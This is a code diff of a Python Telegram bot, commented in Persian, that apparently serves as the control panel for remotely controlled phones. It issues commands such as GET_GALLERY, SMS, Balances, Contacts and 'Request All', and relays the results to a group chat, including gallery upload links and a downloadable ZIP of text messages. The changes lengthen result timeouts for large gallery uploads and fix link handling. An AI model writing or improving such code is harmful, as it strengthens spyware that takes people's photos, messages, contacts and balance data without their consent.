@@ -33,8 +33,13 @@ bot = telebot.TeleBot(BOT_TOKEN)
 
 temp_data = {}
 EXPIRE_TIME = 600
-COMMAND_RETRY_LIMIT = 20
-GALLERY_RETRY_LIMIT = 200
+
+# ============================================================
+# ★★★ تایم‌اوت انتظار برای نتیجهٔ دستورات (به ثانیه) ★★★
+# ============================================================
+COMMAND_RESULT_TIMEOUT = 60        # دستورات معمولی (Ping، SMS، Balances، Contacts و...)
+GALLERY_RESULT_TIMEOUT = 1200      # دستور GET_GALLERY → آپلود سنگین رسانه؛ ۲۰ دقیقه برای همهٔ سناریوها (اینترنت ضعیف/گالری بزرگ)
+REQUEST_ALL_RESULT_TIMEOUT = 45    # انتظار به‌ازای هر دستگاه در «Request All»
 
 pending_notifications_cache = deque(maxlen=200)
 is_processing_notification = False
@@ -1126,10 +1131,13 @@ def send_command_to_device(chat_id, set_code, command_type, params=None, edit_me
     safe_edit_or_send(chat_id, msg, edit_message_id)
 
     def check_and_send_result():
-        # ★★★ FIX: نتیجه از command_results خوانده می‌شود (نه pending_requests) ★★★
+        # نتیجه از command_results خوانده می‌شود (نه pending_requests)
         key = str(command_id)
-        retry_limit = (GALLERY_RETRY_LIMIT if command_type == "GET_GALLERY" else COMMAND_RETRY_LIMIT) * 3
-        for attempt in range(retry_limit):
+        # ★★★ تایم‌اوت مناسب: گالری (آپلود سنگین رسانه) به زمان بسیار بیشتری نیاز دارد ★★★
+        timeout_seconds = GALLERY_RESULT_TIMEOUT if command_type == "GET_GALLERY" else COMMAND_RESULT_TIMEOUT
+        deadline = time.time() + timeout_seconds
+
+        while time.time() < deadline:
             time.sleep(1)
 
             result_data = ws_client.command_results.get(key)
@@ -1147,21 +1155,23 @@ def send_command_to_device(chat_id, set_code, command_type, params=None, edit_me
                 ws_client.expected_commands.discard(key)
                 return
 
-            if attempt == retry_limit - 1:
-                logger.warning(f"Result for command {command_id} not found after timeout.")
-                device_name = get_display_name(set_code)
-                error_msg = f"⏰ <b>Command Timeout</b>\n"
-                error_msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
-                error_msg += f"🔑 Code: <code>{set_code}</code>\n"
-                error_msg += f"❌ No response received within {retry_limit // 3} seconds."
-                if set_code:
-                    error_msg += f"\n\n🔑 /{set_code}"
-                try:
-                    bot.send_message(GROUP_CHAT_ID, error_msg, parse_mode='HTML')
-                except:
-                    pass
-                ws_client.command_results.pop(key, None)
-                ws_client.expected_commands.discard(key)
+        # ★★★ FIX: پیام تایم‌اوت حالا زمان واقعی را نشان می‌دهد (قبلاً retry_limit//3 عدد اشتباه بود) ★★★
+        logger.warning(f"Result for command {command_id} not found after {timeout_seconds}s timeout.")
+        device_name = get_display_name(set_code)
+        minutes = timeout_seconds // 60
+        time_label = f"{minutes} دقیقه" if minutes >= 1 else f"{timeout_seconds} ثانیه"
+        error_msg = f"⏰ <b>Command Timeout</b>\n"
+        error_msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
+        error_msg += f"🔑 Code: <code>{set_code}</code>\n"
+        error_msg += f"❌ No response received within {time_label}."
+        if set_code:
+            error_msg += f"\n\n🔑 /{set_code}"
+        try:
+            bot.send_message(GROUP_CHAT_ID, error_msg, parse_mode='HTML')
+        except:
+            pass
+        ws_client.command_results.pop(key, None)
+        ws_client.expected_commands.discard(key)
 
     threading.Thread(target=check_and_send_result, daemon=True).start()
     return True
@@ -1221,14 +1231,30 @@ def send_result_to_group(command_type, command_id, set_code, result_data=None):
             msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
             msg += f"📊 Uploaded: <code>{uploaded}</code> / <code>{total}</code>\n"
             msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+
+            # ★★★ FIX: تلگرام حداکثر ۱۰۰ دکمه در هر کیبورد مجاز است.
+            # اگر لینک‌ها زیاد باشند، به‌جای دکمه، لینک‌ها را به‌صورت فایل متنی بفرست تا پیام کرش نکند. ★★★
+            MAX_URL_BUTTONS = 90   # زیر سقف ۱۰۰ (جای دکمهٔ بازگشت هم هست)
+            if len(urls) > MAX_URL_BUTTONS:
+                content = "\n".join(f"{i}. {u}" for i, u in enumerate(urls, 1))
+                caption = (
+                    f"🖼️ GALLERY RESULT\n"
+                    f"📱 Device: {device_name}\n"
+                    f"📊 Uploaded: {uploaded} / {total}\n"
+                    f"🔗 تعداد لینک‌ها: {len(urls)}"
+                )
+                send_as_file(GROUP_CHAT_ID, content, f"gallery_links_{set_code}.txt", caption, set_code)
+                logger.info(f"✅ Gallery result for {set_code} sent as file with {len(urls)} links.")
+                return True
+
             keyboard = telebot.types.InlineKeyboardMarkup(row_width=1)
             for idx, url in enumerate(urls, 1):
                 short_url = url[:40] + "..." if len(url) > 40 else url
-                safe_url = escape_html(url)
+                # ★★★ FIX: لینکِ دکمه باید URL خام باشد (نه HTML-escape شده) تا لینک‌های دارای & نشکنند ★★★
                 button_text = f"📎 Part {idx}: {escape_html(short_url)}"
                 keyboard.add(telebot.types.InlineKeyboardButton(
                     button_text,
-                    url=safe_url
+                    url=url
                 ))
             keyboard.add(telebot.types.InlineKeyboardButton(
                 "🔙 Back to Device Panel",
@@ -1265,10 +1291,10 @@ def send_result_to_group(command_type, command_id, set_code, result_data=None):
             msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
             msg += f"📎 فایل پیامک‌ها آماده دانلود است."
             keyboard = telebot.types.InlineKeyboardMarkup(row_width=1)
-            safe_url = escape_html(file_url)
+            # ★★★ FIX: لینکِ دکمه باید URL خام باشد (نه escape شده) تا لینک نشکند ★★★
             keyboard.add(telebot.types.InlineKeyboardButton(
                 "📥 دانلود فایل پیامک‌ها (ZIP)",
-                url=safe_url
+                url=file_url
             ))
             keyboard.add(telebot.types.InlineKeyboardButton(
                 "🔙 Back to Device Panel",
@@ -1387,7 +1413,8 @@ def process_request_all(chat_id, message_id, command_type):
 
             def check_and_send_result(cmd_id, s_code):
                 key = str(cmd_id)
-                for attempt in range(COMMAND_RETRY_LIMIT):
+                deadline = time.time() + REQUEST_ALL_RESULT_TIMEOUT
+                while time.time() < deadline:
                     time.sleep(1)
                     result_data = ws_client.command_results.get(key)
                     if result_data is not None:
@@ -1395,7 +1422,7 @@ def process_request_all(chat_id, message_id, command_type):
                         ws_client.command_results.pop(key, None)
                         ws_client.expected_commands.discard(key)
                         return
-                logger.warning(f"Result for command {cmd_id} not found after timeout.")
+                logger.warning(f"Result for command {cmd_id} not found after {REQUEST_ALL_RESULT_TIMEOUT}s timeout.")
                 ws_client.command_results.pop(key, None)
                 ws_client.expected_commands.discard(key)
 
